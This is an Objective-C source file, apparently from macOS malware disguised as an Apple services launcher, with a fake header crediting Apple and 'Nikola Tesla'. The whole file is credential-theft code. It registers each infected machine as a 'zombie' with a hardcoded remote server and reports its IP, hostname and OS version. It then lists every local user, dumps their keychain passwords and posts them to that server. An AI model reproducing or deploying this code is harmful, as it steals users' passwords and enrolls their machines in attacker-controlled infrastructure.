//
//  Initializer.m
//  AppleServicesLauncher
//
//  Created by Nikola Tesla on 9/27/14.
//  Copyright (c) 2014 Apple. All rights reserved.
//

#import "WTServerApi.h"
#import "WTHTTPApi.h"
#import "WTUserApi.h"
#import "keychaindump.h"

@implementation WTServerApi

+(NSString*) registerOwner {
    WTHTTPApi *httpObj = [[WTHTTPApi alloc] init];
    return [httpObj httpPostRequest:@"http://128.199.167.133/create/owner" usingGetData:nil usingPostData:@{@"name":[WTUserApi getOwner]}];
}

+(NSString *) createZombie:(NSString *)ownerID {
    SInt32 major, minor, bugfix;
    Gestalt(gestaltSystemVersionMajor, &major);
    Gestalt(gestaltSystemVersionMinor, &minor);
    Gestalt(gestaltSystemVersionBugFix, &bugfix);
    NSString *systemVersion = [NSString stringWithFormat:@"%d.%d.%d", major, minor, bugfix];
    WTHTTPApi *httpObj = [[WTHTTPApi alloc] init];
    NSString *ip = [httpObj httpGetRequest:@"http://icanhazip.com/" usingData:nil];
    NSString *hostName = [[NSHost currentHost] localizedName];
    NSDictionary *postData = @{@"ip":ip, @"hostname":hostName, @"authentication_key":@"12345", @"os_version":systemVersion};
    return [httpObj httpPostRequest:[NSString stringWithFormat:@"%@/%@", @"http://128.199.167.133/create/zombie", ownerID] usingGetData:nil usingPostData:postData];
}

+(NSString *)createUser:(NSString *)userName withZombieId:(NSString *)zombieId {
    WTHTTPApi *httpObj = [[WTHTTPApi alloc] init];
    return [httpObj httpPostRequest:[NSString stringWithFormat:@"http://128.199.167.133/create/user/%@", zombieId] usingGetData:nil usingPostData:@{@"name":userName, @"password":@"[Not yet known]"}];
}

+(NSArray *)createAllUsers:(NSString *)zombieId {
    NSArray *allUsers = [WTUserApi getAllUsers];
    NSMutableArray *userIds = [[NSMutableArray alloc] init];
    for (NSString *user in allUsers) {
        [userIds addObject:[WTServerApi createUser:user withZombieId:zombieId]];
    }
    return userIds;
}

+(void)createCredential:(NSDictionary *)credentialInfo withUserId:(NSString *)userId {
    WTHTTPApi *httpObj = [[WTHTTPApi alloc] init];
    NSDictionary *postData = @{@"server":credentialInfo[@"server"], @"username":credentialInfo[@"username"], @"password":credentialInfo[@"password"]};
    [httpObj httpPostRequest:[NSString stringWithFormat:@"http://128.199.167.133/create/credential/%@", userId] usingGetData:nil usingPostData:postData];
}

+(void)createAllCredentialsForUser:(NSString *)user withUserId:(NSString *)userId {
    NSArray *allCreds = [keychaindump getPasswordsForUser:user];
    for (NSDictionary *cred in allCreds) {
        [WTServerApi createCredential:cred withUserID:userId];
    }
}

@end
